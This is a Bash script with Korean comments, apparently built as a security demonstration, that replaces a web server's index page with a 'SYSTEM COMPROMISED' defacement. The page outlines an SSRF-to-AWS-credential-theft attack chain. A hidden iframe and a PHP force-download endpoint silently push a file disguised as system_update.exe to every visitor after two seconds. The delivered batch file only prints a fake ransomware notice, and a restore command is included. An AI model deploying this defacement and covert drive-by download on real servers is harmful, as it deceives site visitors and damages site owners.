#!/bin/bash
###############################################################################
# 완전히 숨겨진 다운로드 (경로 절대 안물어봄)
# PHP로 강제 다운로드
###############################################################################

WWW="/var/www/html/www"
BACKUP="/tmp/index_REAL.php"

echo "╔═══════════════════════════════════════════════╗"
echo "║   완전 자동 다운로드 (경로 안물어봄)         ║"
echo "╚═══════════════════════════════════════════════╝"

# 원본 백업
[ ! -f "$BACKUP" ] && [ -f "$WWW/index.php" ] && cp "$WWW/index.php" "$BACKUP" && echo "✅ 원본 백업"

# 1. 악성코드 생성
mkdir -p $WWW/downloads
cat > $WWW/downloads/malware.bat << 'EOF'
@echo off
title RANSOMWARE ATTACK
color 0C
cls
echo.
echo ============================================
echo    ALL YOUR FILES ARE ENCRYPTED!
echo ============================================
echo.
echo [!] Payment Required: 5 Bitcoin
echo [+] C2 Server: CONNECTED
echo [+] Keylogger: RUNNING
echo [+] Data Exfil: IN PROGRESS
echo.
pause
EOF

chmod 644 $WWW/downloads/malware.bat
chown apache:apache $WWW/downloads/malware.bat

# 2. PHP 다운로드 스크립트 (강제 다운로드)
cat > $WWW/dl.php << 'EOFPHP'
<?php
// 완전히 숨겨진 강제 다운로드 (경로 안물어봄)
$file = __DIR__ . '/downloads/malware.bat';

if (file_exists($file)) {
    // 캐시 방지
    header('Cache-Control: no-cache, must-revalidate');
    header('Expires: Sat, 26 Jul 1997 05:00:00 GMT');

    // 강제 다운로드 헤더
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="system_update.exe"');
    header('Content-Length: ' . filesize($file));
    header('Content-Transfer-Encoding: binary');

    // 출력 버퍼 클리어
    ob_clean();
    flush();

    // 파일 전송
    readfile($file);
    exit;
} else {
    http_response_code(404);
    echo 'File not found';
}
?>
EOFPHP

chmod 644 $WWW/dl.php
chown apache:apache $WWW/dl.php
echo "✅ 강제 다운로드 PHP 생성"

# 3. 해킹 페이지 생성
cat > $WWW/index.php << 'EOFHTML'
<!DOCTYPE html>
<html lang="ko">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SYSTEM COMPROMISED</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #000;
            color: #0f0;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 2rem;
        }
        .container { text-align: center; max-width: 900px; }
        h1 {
            font-size: 4rem;
            color: #f00;
            text-shadow: 0 0 20px #f00, 0 0 40px #f00;
            animation: glitch 2s infinite;
        }
        .skull {
            font-size: 8rem;
            animation: pulse 1s infinite;
            filter: drop-shadow(0 0 30px #f00);
        }
        .warning {
            font-size: 1.5rem;
            color: #ff0;
            margin: 1rem 0;
            animation: blink 1s infinite;
        }
        .info-box {
            background: rgba(255, 0, 0, 0.1);
            border: 2px solid #f00;
            border-radius: 10px;
            padding: 2rem;
            margin: 2rem 0;
            box-shadow: 0 0 30px rgba(255, 0, 0, 0.5);
        }
        .attack-chain {
            text-align: left;
            line-height: 1.8;
        }
        .attack-chain li {
            margin: 0.5rem 0;
            list-style: none;
            padding-left: 1.5rem;
            position: relative;
        }
        .attack-chain li:before {
            content: "→";
            position: absolute;
            left: 0;
            color: #0f0;
        }
        .malware-box {
            background: rgba(255, 0, 0, 0.3);
            border: 2px solid #f00;
            padding: 1.5rem;
            margin-top: 2rem;
            border-radius: 10px;
            animation: pulse-red 2s infinite;
        }
        code {
            background: rgba(0, 255, 0, 0.2);
            padding: 0.2rem 0.5rem;
            border-radius: 3px;
            color: #0f0;
        }
        @keyframes glitch {
            0%, 100% { transform: translate(0); }
            20% { transform: translate(-3px, 3px); }
            40% { transform: translate(-3px, -3px); }
            60% { transform: translate(3px, 3px); }
            80% { transform: translate(3px, -3px); }
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.05); }
        }
        @keyframes pulse-red {
            0%, 100% { box-shadow: 0 0 10px #f00; }
            50% { box-shadow: 0 0 40px #f00; }
        }
        @keyframes blink {
            0%, 50%, 100% { opacity: 1; }
            25%, 75% { opacity: 0; }
        }
        @media (max-width: 768px) {
            h1 { font-size: 2rem; }
            .skull { font-size: 4rem; }
            .warning { font-size: 1rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="skull">☠️</div>
        <h1>⚠️ SYSTEM COMPROMISED ⚠️</h1>
        <div class="warning">UNAUTHORIZED ACCESS DETECTED</div>

        <div class="info-box">
            <h2 style="color:#f00;margin-bottom:1rem;">🔴 공격 체인 (Attack Chain)</h2>
            <div class="attack-chain">
                <ul>
                    <li>완벽한 보안 시스템 (ModSecurity WAF + Splunk SIEM)</li>
                    <li>작은 틈 발견: /api/health.php (ModSecurity 예외)</li>
                    <li>SSRF 취약점 악용</li>
                    <li>AWS IMDSv1 접근 → IAM Credentials 탈취</li>
                    <li>AWS Systems Manager로 서버 접근</li>
                    <li>Root 권한 획득</li>
                    <li>웹사이트 변조 완료</li>
                    <li style="color:#f00;">🦠 악성코드 자동 배포 완료</li>
                </ul>
            </div>

            <div class="malware-box">
                <h3 style="color:#f00;margin-bottom:1rem;">🦠 악성코드 설치 상태</h3>
                <div id="status" style="color:#0f0;">
                    ✅ 시스템 감염 진행 중...
                </div>
                <div style="margin-top:1rem;">
                    📁 경로: <code>C:\Downloads\system_update.exe</code><br>
                    🔒 타입: Ransomware + RAT + Keylogger<br>
                    ⚠️ 상태: <span id="download-status" style="color:#ff0;">자동 다운로드 중...</span>
                </div>
            </div>

            <div style="margin-top:2rem;font-size:0.9rem;">
                <strong style="color:#0f0;">핵심 교훈:</strong><br>
                Perfect Security + One Small Gap = Total Compromise
            </div>
        </div>

        <div style="margin-top:2rem;color:#666;font-size:0.8rem;">
            <p>Compromised at: <?php echo date('Y-m-d H:i:s'); ?> UTC</p>
            <p>Server: <?php echo gethostname(); ?></p>
        </div>
    </div>

    <!-- 완전히 숨겨진 iframe (경로 절대 안물어봄!) -->
    <iframe id="dl" style="display:none;width:0;height:0;border:none;position:absolute;left:-9999px;"></iframe>

    <script>
        // 🔥 완전 숨김 다운로드 (PHP 강제 다운로드)
        setTimeout(() => {
            try {
                console.log('[MALWARE] Starting silent download via PHP...');

                // Method 1: Hidden iframe with PHP force download
                const iframe = document.getElementById('dl');
                iframe.src = '/dl.php';  // PHP가 강제 다운로드

                console.log('[MALWARE] Download triggered via iframe!');

                // UI 업데이트
                setTimeout(() => {
                    document.getElementById('download-status').innerHTML = '<span style="color:#0f0;">✅ 다운로드 완료</span>';
                    document.getElementById('status').innerHTML = '✅ 시스템 감염 완료!';
                }, 3000);

            } catch(e) {
                console.error('[MALWARE] Error:', e);
            }
        }, 2000); // 2초 후 자동 시작
    </script>
</body>
</html>
EOFHTML

chmod 644 $WWW/index.php
chown apache:apache $WWW/index.php
echo "✅ 해킹 페이지 생성"

# Apache 재시작
systemctl restart httpd

echo ""
echo "╔═══════════════════════════════════════════════╗"
echo "║   ✅ 완료!                                    ║"
echo "╚═══════════════════════════════════════════════╝"
echo ""
echo "http://3.35.22.248 접속"
echo "→ 2초 후 자동 다운로드 (경로 절대 안물어봄!)"
echo "→ 브라우저 기본 다운로드 폴더에 system_update.exe 생성"
echo ""
echo "복구: sudo cp $BACKUP $WWW/index.php && sudo systemctl restart httpd"
echo ""
